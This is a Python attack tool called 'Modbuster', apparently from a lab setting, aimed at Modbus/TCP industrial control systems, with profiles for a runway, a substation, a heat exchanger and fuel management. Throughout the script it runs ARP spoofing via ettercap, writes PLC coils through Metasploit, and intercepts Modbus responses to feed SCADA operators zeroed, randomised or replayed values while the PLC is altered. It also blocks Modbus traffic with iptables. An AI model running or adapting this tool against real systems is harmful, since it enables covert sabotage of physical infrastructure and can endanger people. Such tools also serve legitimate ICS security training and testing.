import os
import subprocess
import time
import sys
import importlib
import nm_config
import shutil
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
from scapy.sendrecv import sniff, send, sendp
from scapy.utils import hexdump
from scapy.volatile import RandIP
from netfilterqueue import NetfilterQueue

def setconfig():
    print("\n=== Load Configuration File ===")
    print("1) Runway")
    print("2) Substation")
    print("3) Heat Exchanger")
    print("4) Fuel Management")
    print("q) Return to Main Menu")
    select = input(">> ").strip().lower()
    
    profiles = {
        "1": "runway",
        "2": "substation",
        "3": "heatex",
        "4": "fuelman"
    } 
    
    if select in profiles:
        source = f"./scadaconf/{profiles[select]}"
        destination = "./nm_config.py"
        
        try:
            if os.path.exists(source):
                shutil.copy2(source, destination)
                importlib.reload(nm_config)
                print(f"\n[+] Successfully loaded {profiles[select]} configuration")
            else:
                print(f"\n[!] Error: Source file {source} not found.")
                
        except Exception as e:
            print(f"\n[!] Failed to copy configuration: {e}")
            
        time.sleep(1)
        return

    elif select == "q":
        return
    else:
        print("Invalid selection")
        time.sleep(1)
        setconfig()

def clear():
    subprocess.run(["clear"], check=True)
    
def etterspoof():
    print("Checking ettercap...")
    if subprocess.getoutput("pgrep -x -c ettercap") == "0":
        print("\n\nEttercap is not enabled. Activating ARP Spoofing...\n\n")
        intrfce = input("Enter Interface Name: ") 
        time.sleep(2)

        cmd = ["ettercap", "-Tq", "-i", intrfce, "-M", f"arp:remote", f"{nm_config.scada_mac}/{nm_config.scada_ip}//", f"{nm_config.modcli_mac}/{nm_config.modcli_ip}//"]
        print(f"Executing: {' '.join(cmd)}")
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, start_new_session=True)
        time.sleep(5)
    else:
        print("Ettercap is already running!")
        time.sleep(1)
    clear()
    return

def dos():
    def firewall():
        print("Selected DoS variation: Modbus Firewall\n")
        print("Select a firewall state\n")
        print("1) On (Blocking Traffic)")
        print("2) Off (Return to default)")
        print("q) Return to DoS Menu")
        select = input(">> ")
        
        if select == "1":
            subprocess.run(["iptables", "-A", "OUTPUT", "-p", "tcp", "-s", nm_config.modcli_ip, "--sport", nm_config.mod_port, "-j", "DROP"], check=True)
            return
        elif select == "2":
            subprocess.run(["iptables", "-F"], check=True)
            return
        elif select == "q":
            dos()
        else:
            firewall()

    try:
        print("Selected option: DoS Attack\n")
        print("1) SYN Flood\n2) Modbus Firewall\nq) Return")
        select = input(">> ")
        if select == "1":
            print("\nNot yet implemented...sorry")
            time.sleep(1)
            dos()
        elif select == "2":
            firewall()
        elif select == "q":
            return
        else:
            return
    except KeyboardInterrupt:
        return

def traffic():
    def capture(packet):
        clear()
        print("Modbus Packet captured")
        hexdump(packet)
        if packet.haslayer(Raw):
            print("\nPacket Raw Load\n")
            print(str(packet[Raw].load) + "\n")
        print("\n-------------------------------------------------------------\n")
        print("Press CTRL + C to Exit")

    try:
        sniff(filter="port "+ nm_config.mod_port +" and src host "+ nm_config.modcli_ip+"", prn=capture, store=0)
        return
    except KeyboardInterrupt:
        print("Exiting...")
        time.sleep(0.5)
        return

def test():
    try:
        sniff(store=0, prn=lambda x: x.summary())
        return
    except KeyboardInterrupt:
        print("Exiting...")
        time.sleep(0.5)
        return

def msfconsole():
    try:
        coil_address = input("Enter Coil Address: ")
        num_coils = int(input("Enter # of Coils: "))
        coil_data = "".join([input(f"Enter state [0/1] for Coil #{x}: ") for x in range(num_coils)])

        msf_commands = (
            f"use auxiliary/scanner/scada/modbusclient; "
            f"set RHOSTS {nm_config.modcli_ip}; "
            f"set action WRITE_COILS; "
            f"set NUMBER {num_coils}; "
            f"set RPORT {nm_config.mod_port}; "
            f"set DATA_COILS {coil_data}; "
            f"set DATA_ADDRESS {coil_address}; "
            f"run; exit"
        )

        subprocess.run(["msfconsole", "-q", "-x", msf_commands], check=True)
    except Exception as e:
        print(f"Error: {e}")
    return

      
def fool():
    
    def nf():

        subprocess.run(["iptables", "-A", "OUTPUT", "-p", "tcp", "-s", nm_config.modcli_ip, "--sport", nm_config.mod_port, "-j", "NFQUEUE", "--queue-num", "0"], check=True)

        def callback(packet):
        
            
            pkt = IP(packet.get_payload())
            
            if pkt.haslayer(Raw):
            
                clear()
                
                print("Modbus Response Packet Intercepted")
                
                hexdump(pkt)
                
                bytecnt = pkt[Raw].load[8]
                
                data = pkt[Raw].load[:9] + int(bytecnt/2)*b'\x00\x00'
                
                pkt[Raw].load = data
                
                print("Registers cleared")
                hexdump(pkt)
                
                del pkt[IP].len
                del pkt[IP].chksum
                del pkt[TCP].chksum
            
            packet.drop()
            send(pkt)
            
        
        nfqueue = NetfilterQueue()
        nfqueue.bind(0, callback)
        try:
            print("Intercepting Packets...")
            nfqueue.run()
        except KeyboardInterrupt:
            print("Reseting iptables to default...")
        finally:	
            subprocess.run(["iptables", "-F"], check=True)
            print("Exiting...")
            try:
                nfqueue.unbind()
            except:
                pass
            nfqueue.bind(0, callback)
        
    def randpacket():
        subprocess.run(["iptables", "-A", "OUTPUT", "-p", "tcp", "-s", nm_config.modcli_ip, "--sport", nm_config.mod_port, "-j", "NFQUEUE", "--queue-num", "0"], check=True)

        def callback(packet):
        
            
            pkt = IP(packet.get_payload())
            
            if pkt.haslayer(Raw):
            
                clear()
                
                print("Modbus Response Packet Intercepted")
                
                hexdump(pkt)
                
                bytecnt = pkt[Raw].load[8]
                
                data = pkt[Raw].load[:9] + int(bytecnt) * os.urandom(1)
                
                pkt[Raw].load = data
                
                print("Registers cleared")
                hexdump(pkt)
                
                del pkt[IP].len
                del pkt[IP].chksum
                del pkt[TCP].chksum
            
            packet.drop()
            send(pkt)
            
        
        nfqueue = NetfilterQueue()
        nfqueue.bind(0, callback)
        try:
            print("Intercepting Packets...")
            nfqueue.run()
        except KeyboardInterrupt:
            print("Resetting iptables to default...")
        finally:	
            subprocess.run(["iptables", "-F"], check=True)
            print("Exiting...")
            try:
                nfqueue.unbind()
            except:
                pass
            nfqueue.bind(0, callback)

    def preserve():
    
        def init():
        
            global cflag
            cflag = "0"

            def pull(packet):
                
                print("Modbus Packet Intercepted")
                    
                hexdump(packet)
                
                if packet.haslayer(Raw):
                    
                    print("Modbus Raw Layer Intercepted, Storing...")
                    
                    global coildata
                    coildata = packet[Raw].load[9:]
                    
                    global cflag
                    cflag = "0"
                     
                    print(coildata)
                    
                    
                    
            sniff(filter="port "+ nm_config.mod_port +" and src host "+ nm_config.modcli_ip, prn=pull, count=10)
        
        def callback(packet):
        
            
            pkt = IP(packet.get_payload())
            
            if pkt.haslayer(Raw):
            
                clear()
                
                print("Modbus Response Packet Intercepted")
                
                hexdump(pkt)
                
                bytecnt = pkt[Raw].load[8]
                
                data = pkt[Raw].load[:9] + coildata
                
                pkt[Raw].load = data
                
                print("Registers mimic saved state")
                hexdump(pkt)
                
                del pkt[IP].len
                del pkt[IP].chksum
                del pkt[TCP].chksum
            
            packet.drop()
            send(pkt)
            
        
        nfqueue = NetfilterQueue()
        nfqueue.bind(0, callback)		
    
        try:
            init()
            if cflag == "0":
                print("No Modbus Raw Layer found...\n\n")
                time.sleep(1)
                fool()
            
            
            coil_address = input("Enter Coil Address: ")
            num_coils = int(input("Enter # of Coils: "))
            coil_data = ""
            for x in range(num_coils):
                coil_temp = input("Enter state[0/1] for Coil #" + str(x) + ": ")
                coil_data += coil_temp

            input("Press any key to send command...")
            print("Loading msfconsole with given parameters...")

            #subprocess.Popen("sudo qterminal -e \"
            #try:
            subprocess.Popen("msfconsole -q -x \"use auxiliary/scanner/scada/modbusclient;set RHOSTS "+ nm_config.modcli_ip+";set action WRITE_COILS;set NUMBER " + str(num_coils) + ";set RPORT " + nm_config.mod_port + ";set DATA_COILS " + coil_data + "; set DATA_ADDRESS " + coil_address + "; run;\"", shell=True, preexec_fn=os.setpgrp)
            #except:
            subprocess.run(["iptables", "-A", "OUTPUT", "-p", "tcp", "-s", nm_config.modcli_ip, "--sport", nm_config.mod_port, "-j", "NFQUEUE", "--queue-num", "0"], check=True)

            
            
            print("Intercepting Packets...")
            nfqueue.run()
            
        except KeyboardInterrupt:
            print("Reseting iptables to default...")
            subprocess.run(["iptables", "-F"], check=True)
            print("Exiting...")
            time.sleep(0.5)
            nfqueue.bind()
            return
            pass
    try:
        print("Checking ettercap...")
        
        if subprocess.getoutput("pgrep -x -c ettercap") == "0":
            print("\n\nEttercap is not enabled. Please enable ARP Spoofing...\n\n")
            time.sleep(1)
            return
        else:
            print("Ettercap is running!\n")
            
        print ("Selected option: Fool SCADA\n")
        time.sleep(0.5)
        
        print("Select an attack variation\n")
        print("1) Randomize SCADA (Preserve PLC)")
        print("2) Preserve SCADA (Clear PLC)")
        print("3) Clear SCADA (Preserve PLC)")
        print("q) Return to Main Menu")
        select = input(">> ")
            
        if(select == "1"):
            randpacket()
        elif(select == "2"):
            preserve()
        elif(select == "3"):
            nf()
        elif(select == "q"):
            return
        else:
            print("Invalid option, returning to menu")
            time.sleep(0.5)
            nf()
    except KeyboardInterrupt:
        print("Reseting iptables to default...")
        subprocess.run(["iptables", "-F"], check=True)
        print("Exiting...")
        return
        pass

def main():
    # Use a loop to keep the menu alive without recursion
    while True:
        clear()
        print(""" 
---------------------------------------------
       __   __   __        __  ___  ___  __  
 |\/| /  \ |  \ |__) |  | /__`  |  |__  |__) 
 |  | \__/ |__/ |__) \__/ .__/  |  |___ |  \ 
                                             
---------------------------------------------
    
NCREPT ModbusTCP Python 3.9 Script
by Gideon
modified by Jesse Cutshall
        \n""")
        
        time.sleep(0.5)
        
        print("Select a function from the options below\n")
        print("1) Write to Coils/Holding Registers")
        print("2) Fool SCADA ")
        print("3) DoS Attack")
        print("4) View ModbusTCP Traffic")
        print("5) Test Traffic Function (View All Traffic)")
        print("6) Enable ARP Spoofing")
        print("7) Set Configuration File ")
        print("q) Exit Modbuster")
        
        try:
            select = input(">> ")
            if select == "1":
                msfconsole()
            elif select == "2":
                fool()
            elif select == "3":
                dos()
            elif select == "4":
                traffic()
            elif select == "5":
                test()
            elif select == "6":
                etterspoof()
            elif select == "7":
                setconfig()
            elif select == "q":
                print("Exiting...")
                sys.exit(0)
            else:
                print("Invalid option\n")
                time.sleep(1.5)
                
                
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(0)

if __name__ == "__main__":
    main()
